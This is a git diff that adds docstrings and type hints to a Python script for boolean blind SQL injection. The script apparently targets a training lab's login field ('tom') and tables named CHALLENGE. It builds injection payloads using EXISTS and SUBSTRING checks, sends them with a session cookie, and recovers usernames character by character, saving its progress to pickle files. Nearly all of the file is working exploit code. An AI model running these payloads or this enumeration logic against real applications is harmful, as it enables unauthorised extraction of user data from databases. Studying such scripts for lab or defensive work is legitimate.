@@ -4,7 +4,12 @@ import tabulate
 import string
 
 
-def print_usernames():
+def print_usernames() -> None:
+    """
+    Reads the usernames.pkl file and prints the output using tabulate
+
+    :return: None
+    """
     data = pickle.load(open('outputs/usernames.pkl', 'rb'))
     row = []
 
@@ -15,21 +20,48 @@ def print_usernames():
     print(tabulate.tabulate(row, headers=["Table Name", "Column Name", "Usernames"]))
 
 
-def check_query(column_name, table_name, user_id):
+def check_query(column_name: str, table_name: str, user_id: str):
+    """
+    Returns a query string for SQL injection that is used to find the candidate names that are valid.
+
+    :param column_name: Name of the column to search in for
+    :param table_name: Name of the table to search in for
+    :param user_id: User id  to look for
+    :return: Query String
+    """
     return (
         f'tom\' and exists (select {column_name} from {table_name} where '
         f'{column_name}=\'{user_id}\')--'
     )
 
 
-def builder_query(column_name, table_name, length, word):
+def builder_query(column_name: str, table_name: str, length: int, word: str) -> str:
+    """
+    Returns a query string for SQL injection that is used to build the list of possible candidates.
+
+    :param column_name: Name of the column to look in for
+    :param table_name: Name of the table to search in for
+    :param length: Length of the sequence
+    :param word: Sequence of letters
+    :return: Query String
+    """
     return (
         f'tom\' and exists (select {column_name} from {table_name} where '
         f'substring({column_name},1, {length})=\'{word}\')--'
     )
 
 
-def get_usernames(cookie):
+def get_usernames(cookie: str) -> None:
+    """
+    Retrieves the usernames via backtracking from the USERID field from tables that
+    have names starting with CHALLENGE.
+
+    Saves the program state while iterating and the output as a list of
+    dict<(table_name, column_name), list(username)>
+
+    :param cookie: Session cookie required by the header
+    :return: None
+    """
     usernames = []
     keywords = ['USERID', 'USERNAME', 'USER_ID', 'USER_NAME', 'HANDLE']
     tables_columns = pickle.load(open('outputs/columns.pkl', 'rb'))
@@ -57,6 +89,7 @@ def get_usernames(cookie):
                                 word=word,
                             )
                             no_of_queries += 1
+
                             if inject.inject(cookie=cookie, query=query):
                                 print(
                                     f'Found Word: {word}, {len(word)} - Table: {table_name}'
@@ -75,6 +108,7 @@ def get_usernames(cookie):
                             column_name=column, table_name=table_name, user_id=name
                         )
                         no_of_queries += 1
+
                         if inject.check(cookie=cookie, query=query):
                             print(f'Found Username: {name}')
                             username_dict[(table_name, column)].append(name)
